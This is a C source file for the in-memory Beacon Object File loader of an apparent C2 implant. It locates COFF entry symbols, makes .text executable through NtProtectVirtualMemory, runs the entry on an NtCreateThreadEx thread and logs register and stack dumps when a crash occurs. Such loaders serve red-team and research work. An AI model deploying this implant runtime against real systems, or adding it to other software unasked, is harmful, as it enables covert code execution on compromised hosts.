#include "beacon_bof_internal.h"

typedef VOID (__cdecl *BOF_ENTRY)(PCHAR, DWORD);

typedef struct BofEntryCall {
    BofJobRuntime* runtime;
    PVOID entry_point;
    PVOID argument;
    DWORD argument_size;
} BofEntryCall;

/* 存储 BOF 入口线程信息到运行时结构 */
static VOID BofRuntimeStoreThread(BofJobRuntime* runtime, HANDLE hThread, DWORD threadId)
{
    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    runtime->entry_thread    = hThread;
    runtime->entry_thread_id = threadId;
    InterlockedExchange(&runtime->entry_started, 1);
    LeaveCriticalSection(&runtime->lock);
}

/* 关闭并清理 BOF 入口线程句柄 */
static VOID BofRuntimeCloseEntryThread(BofJobRuntime* runtime)
{
    HANDLE hThread = NULL;

    if (!runtime) return;

    EnterCriticalSection(&runtime->lock);
    hThread = runtime->entry_thread;
    runtime->entry_thread    = NULL;
    runtime->entry_thread_id = 0;
    LeaveCriticalSection(&runtime->lock);

    if (hThread) {
        CloseHandle(hThread);
    }
}

/* 释放 BOF 运行时结构（清零后释放） */
VOID BofRuntimeFree(BofJobRuntime* runtime)
{
    if (!runtime) return;

    BofRuntimeUnregister(runtime);
    BofRuntimeCloseEntryThread(runtime);
    if (runtime->bss_entries) {
        SecureZeroMemory(runtime->bss_entries,
                         (SIZE_T)runtime->bss_entry_capacity * sizeof(BSSEntry));
        HeapFree(GetProcessHeap(), 0, runtime->bss_entries);
        runtime->bss_entries = NULL;
    }
    DeleteCriticalSection(&runtime->lock);
    SecureZeroMemory(runtime, sizeof(*runtime));
    HeapFree(GetProcessHeap(), 0, runtime);
}

static LONG BofEntryExceptionFilter(BofJobRuntime* runtime, PEXCEPTION_POINTERS exceptionInfo)
{
    if (runtime && exceptionInfo &&
        InterlockedCompareExchange(&runtime->exception_seen, 1, 0) == 0) {
        PEXCEPTION_RECORD er = exceptionInfo->ExceptionRecord;
        PCONTEXT ctx = exceptionInfo->ContextRecord;

        runtime->exception_code = er->ExceptionCode;
        runtime->exception_address = er->ExceptionAddress;
        runtime->exception_op = 0xFFFFFFFF;
        runtime->exception_fault_addr = NULL;
        runtime->exception_rip = 0;
        runtime->exception_rax = 0;
        runtime->exception_rcx = 0;
        runtime->exception_rdx = 0;
        runtime->exception_r8 = 0;
        runtime->exception_r9 = 0;
        runtime->exception_rsp = 0;

        /* AV 额外记录访问方向与目标地址；其余异常只留 code/address */
        if (er->ExceptionCode == STATUS_ACCESS_VIOLATION && er->NumberParameters >= 2) {
            runtime->exception_op = (DWORD)er->ExceptionInformation[0];
            runtime->exception_fault_addr = (PVOID)er->ExceptionInformation[1];
        }

        /* 关键寄存器现场（first-chance 上下文，SEH 展开前有效） */
#ifdef _WIN64
        runtime->exception_rip = ctx->Rip;
        runtime->exception_rax = ctx->Rax;
        runtime->exception_rcx = ctx->Rcx;
        runtime->exception_rdx = ctx->Rdx;
        runtime->exception_r8 = ctx->R8;
        runtime->exception_r9 = ctx->R9;
        runtime->exception_rsp = ctx->Rsp;
#else
        runtime->exception_rip = ctx->Eip;
        runtime->exception_rax = ctx->Eax;
        runtime->exception_rcx = ctx->Ecx;
        runtime->exception_rdx = ctx->Edx;
        runtime->exception_r8 = 0;
        runtime->exception_r9 = 0;
        runtime->exception_rsp = ctx->Esp;
#endif
    }

    return EXCEPTION_EXECUTE_HANDLER;
}

static DWORD WINAPI BofEntryThreadProc(PVOID param)
{
    BofEntryCall* call = (BofEntryCall*)param;
    BofJobRuntime* runtime;
    BOF_ENTRY entry;

    if (!call || !call->runtime || !call->entry_point) return 1;

    runtime = call->runtime;
    entry = (BOF_ENTRY)call->entry_point;

    BofRuntimeSetCurrent(runtime);
    __try {
        entry((PCHAR)call->argument, call->argument_size);
    } __except (BofEntryExceptionFilter(runtime, GetExceptionInformation())) {
    }
    BofRuntimeSetCurrent(NULL);

    return 0;
}

/* 通过包装线程调用 BOF 入口，以便设置动态 TLS 并保留父线程清理能力。 */
static BOOL BofHitEntryPoint(BeaconContext* ctx, BofJobRuntime* runtime,
                             PVOID pvEntryPoint, PVOID pvArgument, DWORD dwArgSize)
{
    BofEntryCall* call = NULL;
    HANDLE hThread = NULL;
    DWORD threadId = 0;
    DWORD waitResult;

    if (!ctx || !runtime || !pvEntryPoint ||
        !ctx->api.pfnNtCreateThreadEx || !ctx->api.pfnWaitForSingleObject) {
        BofSetError(runtime, "missing BOF entry thread API");
        return FALSE;
    }

    if (!BofRuntimeEnsureInit()) {
        BofSetError(runtime, "failed to initialize BOF runtime TLS");
        return FALSE;
    }

    call = (BofEntryCall*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*call));
    if (!call) {
        BofSetError(runtime, "failed to allocate BOF entry call");
        return FALSE;
    }

    call->runtime = runtime;
    call->entry_point = pvEntryPoint;
    call->argument = pvArgument;
    call->argument_size = dwArgSize;

    /* 线程起始函数必须是 BofEntryThreadProc: Windows 线程入口只接收一个
     * 参数 (RCX=StartParameter), 直接把 go 当 StartRoutine 的话, go 会把
     * call 结构指针当 args 缓冲、RDX 寄存器残留当 len。由包装函数从 call
     * 取出 argument/argument_size 后再以两参形式调用 go, 并完成 TLS 与
     * SEH 异常保护的安装。 */
    {
        NTSTATUS st = ctx->api.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                                   (HANDLE)-1, (PVOID)BofEntryThreadProc, call,
                                                   0, 0, 0, 0, NULL);

        if (!NT_SUCCESS(st)) {
            HeapFree(GetProcessHeap(), 0, call);
            BofSetError(runtime, "failed to start BOF entry thread: 0x%08lX",
                        (ULONG)st);
            return FALSE;
        }
    }

    BofRuntimeStoreThread(runtime, hThread, threadId);
    for (;;) {
        waitResult = ctx->api.pfnWaitForSingleObject(hThread, 250);
        if (waitResult == WAIT_OBJECT_0) {
            break;
        }
        if (waitResult != WAIT_TIMEOUT) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
            break;
        }
        if ((runtime->stop_event &&
             ctx->api.pfnWaitForSingleObject(runtime->stop_event, 0) == WAIT_OBJECT_0) ||
            JobIsCancelRequested(runtime->job)) {
            /* BOF 仅支持协作取消；继续等待入口线程自行返回。 */
        }
    }

    InterlockedExchange(&runtime->entry_done, 1);
    HeapFree(GetProcessHeap(), 0, call);

    if (waitResult != WAIT_OBJECT_0) {
        if (!runtime->last_error[0]) {
            BofSetError(runtime, "failed waiting for BOF entry thread: 0x%08lX", waitResult);
        }
        return FALSE;
    }

    return TRUE;
}

/* 查找入口点、设置 .text 段可执行、执行 BOF */
BOOL BofRun(BeaconContext* ctx, BofJobRuntime* runtime, PCOFFEE pCoffee, PCHAR szEntryPoint,
            PVOID pvArgument, DWORD dwArgSize)
{
    DWORD cnt = 0;
    PVOID entry_point = NULL;
    SIZE_T secSize = 0;
    ULONG oldProtect = 0;
    BOOL ok = FALSE;

    for (cnt = 0; cnt < pCoffee->Header->NumberOfSymbols; cnt++) {
        if (memcmp(pCoffee->Symbol[cnt].First.Name, szEntryPoint, BofStrLen(szEntryPoint)) == 0) {
            entry_point = (PVOID)(pCoffee->SecMap[pCoffee->Symbol[cnt].SectionNumber - 1].Ptr +
                pCoffee->Symbol[cnt].Value);
            break;
        }
    }

    if (!entry_point) {
        BofSetError(runtime, "entry point not found: %s", szEntryPoint ? szEntryPoint : "(null)");
        return FALSE;
    }

    for (cnt = 0; cnt < pCoffee->Header->NumberOfSections; cnt++) {
        pCoffee->Section = (PCOFF_SECTION)((ULONG_PTR)pCoffee->Data +
            sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * cnt));
        if (BofHashString(pCoffee->Section->Name, COFF_PREP_TEXT_SIZE, FALSE) == COFF_PREP_TEXT) {
            secSize = pCoffee->SecMap[cnt].Size;
            if (secSize != 0) {
                /* NtProtectVirtualMemory 的 BaseAddress 是 PVOID* 入/出参，
                 * 用局部变量承接写回的页对齐基址，避免跨类型取址。 */
                PVOID base = pCoffee->SecMap[cnt].Ptr;
                if (ctx->api.pfnNtProtectVirtualMemory((HANDLE)-1, &base,
                        &secSize, PAGE_EXECUTE_READ, &oldProtect) != 0) {
                    BofSetError(runtime, "failed to protect BOF .text");
                    return FALSE;
                }
                pCoffee->SecMap[cnt].Ptr = (PCHAR)base;
            }
        }
    }

    InterlockedExchange(&runtime->exception_seen, 0);
    runtime->exception_code = 0;
    runtime->exception_address = NULL;
    runtime->exception_op = 0xFFFFFFFF;
    runtime->exception_fault_addr = NULL;
    runtime->exception_rip = 0;
    runtime->exception_rax = 0;
    runtime->exception_rcx = 0;
    runtime->exception_rdx = 0;
    runtime->exception_r8 = 0;
    runtime->exception_r9 = 0;
    runtime->exception_rsp = 0;
    ok = BofHitEntryPoint(ctx, runtime, entry_point, pvArgument, dwArgSize);

    if (!ok) {
        return FALSE;
    }
    if (InterlockedCompareExchange(&runtime->exception_seen, 0, 0) != 0) {
        if (runtime->exception_code == STATUS_ACCESS_VIOLATION &&
            runtime->exception_op != 0xFFFFFFFF) {
            const CHAR* op = "AV";
            const unsigned char* rip_bytes;
            const ULONG_PTR* stack;
            CHAR code_hex[33];
            CHAR stack_hex[129];
            DWORD64* q;
            int i;

            if (runtime->exception_op == 0)      op = "READ";
            else if (runtime->exception_op == 1) op = "WRITE";
            else if (runtime->exception_op == 8) op = "EXEC";

            /* 转储崩点指令字节与栈上前 4 个指针，定位调用方 */
            code_hex[0] = '\0';
            rip_bytes = (const unsigned char*)(ULONG_PTR)runtime->exception_rip;
            if (rip_bytes) {
                static const CHAR H[] = "0123456789abcdef";
                for (i = 0; i < 16; ++i) {
                    code_hex[i * 2]     = H[(rip_bytes[i] >> 4) & 0xF];
                    code_hex[i * 2 + 1] = H[rip_bytes[i] & 0xF];
                }
                code_hex[32] = '\0';
            }
            stack_hex[0] = '\0';
            stack = (const ULONG_PTR*)(ULONG_PTR)runtime->exception_rsp;
            if (stack) {
                static const CHAR H[] = "0123456789abcdef";
                for (i = 0; i < 4; ++i) {
                    DWORD64 v = (DWORD64)stack[i];
                    int j;
                    for (j = 15; j >= 0; --j) {
                        stack_hex[i * 16 + j] = H[v & 0xF];
                        v >>= 4;
                    }
                }
                stack_hex[64] = '\0';
            }

            BofSetError(runtime,
                        "entry raised exception 0x%08lX at %p: %s at 0x%p "
                        "rip=0x%llX code=%s rsp=0x%llX stack=%s "
                        "rax=0x%llX rcx=0x%llX rdx=0x%llX r8=0x%llX r9=0x%llX",
                        runtime->exception_code, runtime->exception_address,
                        op, runtime->exception_fault_addr,
                        runtime->exception_rip, code_hex,
                        runtime->exception_rsp, stack_hex,
                        runtime->exception_rax, runtime->exception_rcx,
                        runtime->exception_rdx, runtime->exception_r8,
                        runtime->exception_r9);
        } else {
            BofSetError(runtime, "entry raised exception 0x%08lX at %p",
                        runtime->exception_code, runtime->exception_address);
        }
        return FALSE;
    }

    return TRUE;
}
